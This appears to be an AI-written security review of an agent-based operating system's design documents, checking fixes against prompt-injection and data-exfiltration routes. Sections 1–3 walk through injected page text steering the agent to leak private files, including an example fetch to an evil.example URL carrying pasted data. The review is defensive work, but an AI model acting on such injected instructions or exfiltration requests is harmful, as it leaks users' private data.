# Security review 2, DeepSeek: an attacker who read the corrected page

Subject: `e8c2b17` of this repository, which applies the verified findings of
`reviews/2026-11-16-security-review-1-*` and `reviews/2026-11-16-wit-review-1-*`
to `architecture/security.md`, `plan/pending-decisions.md` (P-092 to P-103 and
edits to older entries) and a few lines of `ui.md`, `web.md`, `storage.md`,
`platform.md`, `kernel-interface.md`; with the matching contract change `8b6cb05`
of the system repository (`contracts/*.wit`).

What I read: the diff of `e8c2b17` in full, the current text of
`architecture/security.md` (398 lines), `storage.md`, `ui.md`, `web.md`,
`platform.md`, `plan/pending-decisions.md` group 3, `decisions/README.md`
(D-014, D-032, D-035, D-036, D-111, D-119), and the contracts at `8b6cb05`
(`core.wit`, `actions.wit`, `store.wit`, `catalog.wit`, `agent.wit`,
`manifest.wit`, `shell.wit`). External sources were read today, 16 November
2026, and each one is named at the place it is used.

My angle: an attacker who has read the corrected page. For each changed passage
I replayed the attack it targets, looked for a line elsewhere that contradicts
it, checked that each new pending entry pays an honest price for its
recommendation, and checked every external fact at its source.

Line numbers are those of the files as they stand in `e8c2b17`.

---

## 1. The new local-write rule stops at `home`, and the sentence it rests on is false — the file leaves the machine unconfirmed in a task marked `private` and `untrusted`

**Severity: breaks a guarantee.**

**Quotes.**

- `architecture/security.md:184` (point 16, new): "What an action of change
  `reversible` or `irreversible` writes into `home` reaches the long-lived
  instance, which holds the right \"network\" if the manifest asks for it,
  outside any task. So in a task marked `untrusted`, such an action of reach
  `local` in a package whose manifest holds \"network\" is decided by the matrix
  as an external modification: confirmed, held, counted in the external budget."
- `architecture/security.md:182` (point 17, new): "... `get` attenuated to the
  class, `put` and `forget` refused, so nothing the request carried outlives the
  instance".
- `contracts/core.wit:284-289` (same rule in the contract): "`keep`: `get` and
  `slots` only; `get` returns the item attenuated to the class (read-only when
  change is `none`); `put` and `forget` answer `denied`, so nothing the request
  carried outlives the instance".
- `architecture/security.md:351` (point 17, new): "an action then cannot use a
  capability the application kept, such as a folder the user picked once".
- `architecture/security.md:214-217` (the matrix, unchanged): "Local reversible
  modification | Automatic, can be undone | Automatic, can be undone".

**The scenario, step by step.**

1. `pub:sync` is a signed package whose manifest holds the right "network" to
   its own host. Earlier, the user picked `~/Documents` for it once
   (`store.wit:219`, `pick` with `want` containing `write`), and the application
   put that capability in its `keep` table.
2. Its manifest declares the action `save-note`, change `reversible`, reach
   `local`. That class is true as the page defines it: the write is local and
   versioned.
3. A task runs marked `untrusted` and `private`: the agent read a page, and it
   holds the user's file, which the user dropped into the bar (a bound object,
   `actions.wit:107-110`).
4. Injected text makes the model invoke `sync.save-note` with that object bound.
   The matrix row for a local reversible modification is "Automatic, can be
   undone" in both columns. No confirmation.
5. The action instance calls `keep.get("docs")`. Under the new rule the item is
   attenuated to the class, not to read-only — `change` is `reversible` — so it
   receives a writable handle on `~/Documents`, and it writes the user's file
   there. This is not `home`, so point 16's rule does not see it; nothing is
   confirmed, nothing is held, nothing is counted in `budget.external`.
6. The action ends. `pub:sync`'s long-lived instance reads `~/Documents` through
   the same kept capability, outside any task, and sends the file with its
   network right.
7. The journal entry is undoable, so the user could undo the copy later. The
   file has already left.

The result is the combination D-036 forbids — private data, untrusted content,
external communication in one task — with no confirmation, in a task the page
says is protected. It is also the rule the page states as its reason for
existing: "Without this rule, a file that an application saved outside any task
carries no mark" (`security.md:195`) — the mark is now there, and it changes
nothing, because the write leaves through a door the rule does not cover.

The same door has a second lock: the sentence "so nothing the request carried
outlives the instance" (`security.md:182`, `core.wit:287`) is false as written.
What the request carried does outlive the instance whenever the instance writes
it somewhere it can still be read — `home` (the case the page handles), a bound
`os-item` with `write` (`actions.wit:31-36`), or a kept writable item.

**Smallest correction I would write.** In point 16, replace "writes into `home`"
with every write that outlives the instance: "What such an action writes into
`home`, into an item `keep.get` returns, or into a bound item that carries
`write` survives the instance and can be read by the long-lived instance. In a
task marked `untrusted`, every write of an action of reach `local` in a package
whose manifest holds \"network\" is therefore decided as an external
modification." And in point 17 and `core.wit:287`, drop "nothing the request
carried outlives the instance" for "nothing the request carried is *kept*: what
the instance writes where its own component can read it afterwards is the
subject of point 16".

---

## 2. `private` follows a read of a surface's tree and a capture of that surface, but not a paste from it — the external read stays automatic

**Severity: contradiction (and the matrix's `private` cell does not fire).**

**Quotes.**

- `architecture/security.md:196` (new): "**Reading a surface's accessibility
  tree** adds `private` always, since what the user's screen shows is the
  user's, and `untrusted` unless the owner of the surface is the system".
- `architecture/security.md:204` (unchanged, held by the same commit): "**A
  capture carries the marks of what it shows.** A screenshot or a screen
  recording takes the union of the marks of the surfaces it captures, which the
  compositor knows."
- `architecture/security.md:203` (unchanged): "**The user's request keeps the
  provenance of its parts.** Text pasted or dropped into the agent's bar keeps
  the provenance of the object it came from (the clipboard keeps it). A request
  with an untrusted part starts its task with the `untrusted` mark."
- `contracts/store.wit:227-231` (unchanged): "The clipboard keeps each item's
  provenance, and so does every paste: into an application (the items'
  `object-info`), into a catalogue field (the event's provenance), into the
  agent's bar (a request part with that provenance, see `tasks.request`). A
  paste never turns third-party content into origin \"user\"."
- `contracts/core.wit:168-175` (unchanged): "`untrusted` is always set for the
  origins \"app:\", \"web:\", \"device:\" and \"foreign\" ... Reading the data
  adds its marks to the reading task."
- `architecture/security.md:216` (the matrix, unchanged): "External read |
  Automatic | Automatic without the \"private\" mark, confirmation otherwise".

**The scenario, step by step.**

1. The user is looking at their calendar, drawn by a third-party application,
   and asks the agent to "summarise this and the page I have open", pasting the
   text of the calendar into the bar with the copy gesture.
2. The pasted part is a clipboard item the application created. By
   `core.wit:169-171` its origin is `app:<calendar>`, so its marks are
   `untrusted`; nothing adds `private`, because the paste rule (`203`) carries
   the *provenance* of the item and the item came from a producer, not from a
   zone read (`security.md:195` sends only zone reads through the storage
   service; the shell holds the clipboard, `store.wit:197-198`).
3. The task reads the page: `untrusted` (already set). The page is hostile and
   says: fetch `https://evil.example/?d=<the pasted text>`.
4. The matrix row for an external read in a task marked `untrusted` is
   "Automatic without the \"private\" mark". The task is not marked `private`
   — the user's private data reached it as a clipboard item, not as a zone read
   and not as an accessibility read. The fetch runs, unconfirmed, with the
   calendar in the address. That is `security.md:185`'s stated residual ("data
   carried in the address") applied to private data, which is what D-036 exists
   to prevent.

Reading the same surface with `accessibility.read` would have marked the task
`private` (`196`); capturing it with the capture right would have carried the
surface's marks (`204`). Copying out of it adds neither. The three routes lift
the same pixels and text out of the same window into the same task, and one of
them is unmarked.

**Smallest correction I would write.** Extend the new rule from the tree to
every way a surface's content enters a task: "**Reading a surface, by any of
the routes the system offers, adds `private` always and `untrusted` unless the
owner of the surface is the system**: its accessibility tree
(`accessibility`), a selection copied or cut from it (`exchange.copy`), an item
dragged out of it, and a capture of it. A pasted or dropped part therefore
starts its task with the marks of the surface it came from, not only with the
origin of its producer." The compositor already knows a surface's marks
(`204`), so the clipboard path can be given the same source.

---

## 3. "A false class gains nothing for a local action" contradicts the residual the same commit adds

**Severity: contradiction.**

**Quotes.**

- `architecture/security.md:103` (unchanged): "a false class gains nothing for
  a local action (D-035). **Not stopped**: a false class on an action of reach
  `external`".
- `architecture/security.md:184` (new): "In a task without the mark it stays
  automatic, which leaves the residual of a hostile local model".
- `architecture/security.md:183` (unchanged): "For an action of reach `local`,
  the declared class is therefore binding, and lying about it gains nothing."

**Why the two sentences cannot both stand.** The page now admits, in the next
bullet after the quote at `183`, that a local action of a networked package carries the
user's data off the machine with no confirmation whenever the task is not
marked `untrusted`. The application that declares its action `local` and
`reversible`, while its long-lived instance holds the user's file and the
network right, gains exactly what the row at `103` says it cannot gain: the
matrix never asks. The adversary table's row for a hostile or compromised
application is therefore wrong in two ways: the claim at `103` is false under
the page's own new rule, and the row's "Not stopped" list omits the local path
that the model row at `105` now names.

The task in question need not be steered by anything: the user asks "file this
contract in `<app>`" with their own file, the task never reads untrusted
content, and the file is uploaded. The residual is attributed to "a hostile
local model", but here there is no hostile model at all — only a hostile
application the page already counts as an adversary.

**Smallest correction I would write.** In the row at `103`, replace "a false
class gains nothing for a local action (D-035). **Not stopped**: a false class
on an action of reach `external` ([point 1])" with: "a false class gains nothing
for a local action's *effect on the store* (D-035). **Not stopped**: a local
action of a package that holds \"network\", which its long-lived instance can
send, in a task without the `untrusted` mark, and a false class on an action of
reach `external` ([point 1], [point 16])". In `184`, say the residual is "a
hostile application, or a hostile local model".

---

## 4. `TPM2_PolicyAuthorize` is cited to the wrong part of the TCG specification

**Severity: wrong fact.**

**Quotes.**

- `architecture/security.md:55`: "including an old one with a known flaw (TCG,
  TPM 2.0 Library Part 1, `TPM2_PolicyAuthorize`)".
- `plan/pending-decisions.md:908` (P-055, option A): "(TCG, TPM 2.0 Library
  Part 1, `TPM2_PolicyAuthorize`: every policy signed with the key satisfies
  it)".

**What the source says.** `TPM2_PolicyAuthorize` and `TPM2_PolicyAuthorizeNV`
are commands, and commands are defined in Part 3 of the Trusted Platform Module
2.0 Library. Part 1 is the architecture. I read today, 16 November 2026: TCG,
"Trusted Platform Module 2.0 Library Part 3: Commands", Version 185 of 12 March
2026 ([trustedcomputinggroup.org](https://trustedcomputinggroup.org/wp-content/uploads/Trusted-Platform-Module-2.0-Library-Part-3-Commands_Version-185_pub.pdf)),
whose contents list "23.22 TPM2_PolicyAuthorizeNV"; Version 184 of 20 March 2025
lists the same section; and the Part 3 TOC of an earlier revision lists "Table
154 — TPM2_PolicyAuthorize Command" and "Table 166 — TPM2_PolicyAuthorizeNV
Command". TCG, "Trusted Platform Module 2.0 Library Part 1: Architecture"
Version 184, is the architecture volume. The substantive claim the sentence
makes — that a policy satisfied by a signature of the project's key is satisfied
by any later signature of the same key, so every image the project ever signed
can unseal — is correct; only the volume is wrong.

**Smallest correction I would write.** In both places, "TCG, TPM 2.0 Library
Part 3: Commands, `TPM2_PolicyAuthorize`".

---

## 5. "Points 15 to 28 are written there as recommended" is false for seven of the fourteen

**Severity: wrong fact.**

**Quote.** `architecture/security.md:390`: "Points 15 to 28 are written there
as recommended."

**What the contracts at `8b6cb05` contain.** A search of `contracts/` for
"point N" finds points 1, 3, 5, 6, 15, 16, 17, 18, 22, 27 and 28 only:
`core.wit` has 1, 15, 16, 17; `actions.wit` has 5, 16, 18, 27, 28; `catalog.wit`
has 18, 22; `shell.wit` has 28; `agent.wit` has 3, 6; `mcp.md` has 5, 6. Point
19 (which input answers a confirmation and when it takes the focus), point 20
(system material blanked in captures), point 21 (direct scanout), point 23
(third-party words outside system material), point 24 (the disk key), point 25
(dependency review) and point 26 (no JIT for a web application with WIT
interfaces) appear nowhere in `contracts/`: there is no capture interface at
all, no rule on the focus of a confirmation, and nothing about scanout or the
drawing of a confirmation. Points 24 and 25 could not be written there at all.

The same paragraph's earlier sentence is accurate and carefully worded — "Every
row of the earlier list, against `8bc6509`, is answered there" — which makes
this one misleading in exactly the place a reader checks it.

**Smallest correction I would write.** "Points 15, 16, 17, 18, 22, 27 and 28
are written there as recommended; points 19, 20, 21, 23 and 26 have no place in
a WIT file yet, and 24 and 25 are not contract matter."

---

## 6. CaMeL section 6.4 is the attack study of parameter manipulation, not the description of control-flow tracking

**Severity: wrong fact.**

**Quote.** `architecture/security.md:299`: "from the first untrusted read,
everything the task does is treated as influenced, which covers the
control-flow dependencies that CaMeL tracks one by one (section 6.4)". The
citation was changed from 5.4 to 6.4 by this commit.

**What I could read of the source.** Debenedetti et al., arXiv 2503.18813v2 of
24 June 2025. §5.4 is "CaMeL Interpreter" ("We build a custom Python interpreter
that operates over a restricted version of Python"), which is where values are
tracked one by one; §5.3 is "Capabilities", where "Capabilities consist of tags assigned to each
individual value that describe control and data-flow relationships". §6 is the evaluation: the paper's own text
points to §6.4 for an attack, not for the tracking — "in which an adversary
manipulates the query parameters rather than the structure of the query itself.
We show in Section 6.4 that this can be taken one step further and even enable
arbitrary code execution" (arXiv 2503.18813v2, read today through a text proxy
of the PDF). So §6.4 is a subsection of the evaluation in which parameter-level
attacks are shown to reach arbitrary code execution; it is not the place where
the fine-grained tracking is described.

**What I could not read.** Both `arxiv.org/html/2503.18813v2` and the PDF came
back truncated at the top of the paper (the PDF fetch was blocked outright), so
I did not read the body of §6.4 and cannot quote its title. The sentence I did
read is enough to show that §6.4 is not the description of the tracking, and 5.4
— the value the commit replaced — is.

**Smallest correction I would write.** "which covers the control-flow
dependencies that CaMeL tracks one by one (sections 5.3 and 5.4)", or cite the
capabilities section alone.

---

## 7. P-055 option C claims a benefit that needs an authority the entry never names

**Severity: unsettled case.**

**Quotes.**

- `plan/pending-decisions.md:908` (P-055, option C, new): "C. Against the
  signing key and a minimum version in a TPM NV index raised by security
  updates (`TPM2_PolicyAuthorizeNV`, or a counter). Gives: updates do not break
  unlocking, and an old signed image no longer unlocks. Costs: one NV index and
  one write per security update."
- `architecture/security.md:55`: "the policy also requires a minimum version
  held in a TPM NV index (`TPM2_PolicyAuthorizeNV`, or a counter), raised by
  each security update".

**The case the text does not settle.** Say the index holds the lowest version
allowed. Who may write it? It has to be the signed system, because the update
that raises it runs inside one. The old image with the known flaw is also a
signed system. Nothing in the entry says what an old image lacks, and with a
plain "write" the two candidates are: either the index may be rewritten by any
signed image, in which case the attacker boots the old one, writes its own
version back and unseals — option C gives nothing over option A — or the write
needs an authority the old image does not hold, and the entry should say which
and how it is refused. The choice between these two decides whether the
recommendation is worth anything, and the owners are asked to choose it.

The same gap sits in the words "or a counter": a monotonic counter and a
writable index are not interchangeable, since only one of them refuses to go
down.

**Smallest correction I would write.** "C. Against the signing key and a
minimum version held in an NV *counter* that the TPM refuses to decrease
(`TPMA_NV_COUNTER`, read by `TPM2_PolicyNV` in the unseal policy), incremented
once by each security update through an authority no earlier image holds.
Gives: updates do not break unlocking, and an old signed image no longer
unlocks. Costs: one NV counter, one increment per security update, and the
definition of that authority." — or, if the authority cannot be written down
today, state as the cost of C that an old signed image can lower the minimum
and the option then equals A.

---

## 8. Ladybird's `AudioServer` is one per renderer, not a helper that serves one site

**Severity: wrong fact (small).**

**Quote.** `architecture/security.md:139`: "Ladybird's helpers that serve one
site (RequestServer, ImageDecoder, AudioServer)".

**Source read today.** Ladybird's
`Documentation/ProcessArchitecture.md` (read 16 November 2026) has the table
"Process | How many": "**RequestServer** | One per browsing session and
top-level site, plus one per session with no site"; "**ImageDecoder** | One per
browsing session and site, or one for a single process"; "**AudioServer** | One
per renderer", and the prose "**RequestServer** and **ImageDecoder** are shared
by the renderers of a site, while the processes below the renderers each work
for a single renderer". So the first two serve a site and AudioServer serves one
renderer, which can host documents of more than one site.

**Smallest correction I would write.** "Ladybird's helpers that serve one site
(RequestServer, ImageDecoder) and its per-renderer helpers (MediaServer,
AudioServer, VideoDecoderServer, WebRTCClient)".

---

## 9. "row 104" names the wrong row

**Severity: wrong fact (a reference; the sentence itself is new in this commit).**

**Quote.** `architecture/security.md:334` (new): "A hostile local model is not
covered by this recommendation: row 104 keeps it as a residual."

**What line 104 is.** In the current file, line 104 of `security.md` is the row
"Hostile content read by the agent (prompt injection)"; the row for a hostile
model or model provider is line 105, and it is the one that carries the
residual. A reader following the pointer lands on a row that says nothing about
a hostile model. The same idea in `pending-decisions.md` P-037 is given without
a number ("security.md, row of the hostile model") and is right.

**Smallest correction I would write.** "the row of the hostile model in
[Adversaries](#adversaries) keeps it as a residual". (A number will keep
rotting: the file gained lines in this very commit.)

---

## Checked and found correct

- **Microsoft's UEFI signing policy** (`security.md:61`). I read "[UPDATED]:
  Microsoft UEFI Signing Requirements", Microsoft Community Hub, today:
  "Code submitted for UEFI signing must not be subject to GPLv3 or any license
  that purports to give someone the right to demand authorization keys to be
  able to install modified forms of the code on a device." The page's paraphrase
  and its title are right, the consequence for an AGPLv3 system (D-014, and
  D-119 keeping the interface files Apache-2.0) follows, and "as shim loads
  GRUB 2" is right: Microsoft signs shim, shim checks GRUB against the vendor's
  own certificate.
- **Wasmtime's `use_csdb`** (`security.md:374`). `docs.wasmtime.dev/security.html`,
  read today: "Note that on aarch64 the `csdb` instruction is disabled by
  default due to its significant performance penalty, but this can be
  additionally enabled through the `use_csdb` Cranelift setting." Name, default
  and platform are all as the page says.
- **Ladybird's Hub** (`security.md:136`). Same document: Hub "is not sandboxed
  yet. It owns the state that must outlive or be shared between renderers:
  cookies, web storage, blob URLs, permissions and the fonts of the system." The
  page's description is accurate, and putting Hub on the trusted list follows.
- **CaMeL's version** (`security.md:160`): "version 2 of 24 June 2025" matches
  the PDF header "arXiv:2503.18813v2 [cs.CR] 24 Jun 2025".
- **Where `private` comes from, against its own contracts.** `security.md:195`
  says user, application, snapshot and device zones add `private` at read, cache
  and ephemeral keep the writer's marks, system and packages carry none. The
  same rule is in `storage.md:64`, `core.wit:176-187` and `store.wit:44-47`, and
  the zone list of `storage.md:44-54` has exactly those nine zones. No
  contradiction with the asset table at `security.md:87-94`.
- **The attack the `private` rule was written for is closed.** Replaying
  Mistral's finding 1 (`security-review-1-verify-deepseek-by-mistral.md:15-21`):
  a bill read from the user zone now marks its reading task `private`, so the
  external read in a `private` and `untrusted` task reaches the confirmation of
  `security.md:216` instead of running. The store-object path, which the
  verifier narrowed the finding to, is the path the rule names.
- **Attack 2's correction** (`security.md:312`) follows from that rule: once the
  page has been read through the tree the task is `private`, and before any read
  there is no instruction in it.
- **Point 16's mechanics against the contracts.** `security.md:184` and
  `core.wit:300-312` and `actions.wit:226-230` state the same trigger (marked
  task, `reversible` or `irreversible`, reach `local`, package holding
  "network") and the same consequences (confirmed, held, counted in
  `budget.external`, not undoable once done, per `actions.wit:170-174`). Apart
  from the destination covered in finding 1, I found no divergence between the
  three texts.
- **Point 27 against `actions.wit:240-249`**: the grant covers the same action
  with the same arguments and the same objects at the same versions, a call that
  binds a collection always asks, and the grant ends when the task takes the
  `untrusted` mark. The page and the contract agree word for word.
- **Point 28 against `shell.wit:65-72`**: `denied` for the bar and for a
  confirmation, `busy` while the user types into another surface with keys in
  the bar not counting, no key dropped after the move, confirmed in a marked
  task. Same four rules in both places.
- **The `keep` decision of point 17 against `core.wit:284-289`**: `get` and
  `slots` only, `get` attenuated to the class, `put` and `forget` denied. Same
  text, and the alternative (a `keep` that denies everything) is the one the
  contract names.
- **The three rows of "What the WIT contracts lack"** (`security.md:394-396`):
  `manifest.wit:73-100` marks "audio-playback", "microphone", "audio-capture",
  "accessibility-read", "global-shortcuts" and "input-injection" reserved and
  refuses them at install; no right in `manifest.wit` covers the camera or
  screen capture; and no interface in `contracts/` is a notification, as
  `catalog.wit:86` itself says.
- **The side-channel line** (`security.md:373`): `memory.md:23` says "The shared
  cache serves compiled code and native programs (**Decided**)", so the
  "Decided" is right, and the out-of-scope table already says that Spectre-type
  channels between publishers are "reduced, not excluded", which is what the new
  line makes concrete. Not a contradiction.
- **Point 21 against the rest of the page**: the discreet mark not shown over a
  full-screen surface (`security.md:282`) is a real weakening of the indicator
  claim at `security.md:13`, but it is stated, priced and cross-referenced from
  P-047 (`pending-decisions.md:810`), so it is a decision for the owners and not
  a contradiction.
- **Fair alternatives in the new entries.** Beyond finding 7, P-092, P-093,
  P-094, P-095, P-096, P-097, P-098, P-099, P-100, P-101, P-102 and P-103 each
  give the cost in confirmations for every option, the rejected option says why
  it is rejected (P-099 C, P-092 C against "never by the producer", P-093's
  fourth option with the reason it is not recommended), and the recommendation
  follows from the costs as stated. P-049's and P-037's new options carry their
  costs too.

## Smaller points, not counted as findings

- `pending-decisions.md:654` still points at "lines 312-329" for the points and
  "line 132" for the sources of `security.md`; they are now 332-345 and 160. The
  numbers were already stale before this commit (at `e8c2b17^` the sources line
  was 156), so this is old rot, not new; the sentence was nevertheless edited in
  this commit and the numbers could have been fixed with it.
- `security.md:188` lists "a keyboard accepted" among the administration actions
  of fixed class, while point 12 makes acceptance a gesture of the user rather
  than an action. Harmless as written, but the two descriptions of the same act
  differ.

## Not checked

- Anything about the kernel contract in the kernel repository (`dodos-kernel`):
  the "replacement slot" line in `security.md:31` and the open point added at
  `kernel-interface.md:2215` are claims about another repository, and I did not
  open it.
- The body of CaMeL §6.4 (see finding 6): the retrievals I could make of the
  paper stopped before it.
- Whether an Intel fTPM supports `TPM2_PolicyAuthorizeNV` and NV counters as
  option C needs; the page draws the mechanism from the specification, not from
  a firmware's implementation.
- The GPU trial claims behind P-098 option C (`ui.md:14`, marked "from memory"
  in the pending entry) and the latency gate's numbers.
- `plan/progress.md` and the state of pull request 1 of the system repository
  beyond the commit `8b6cb05` itself.
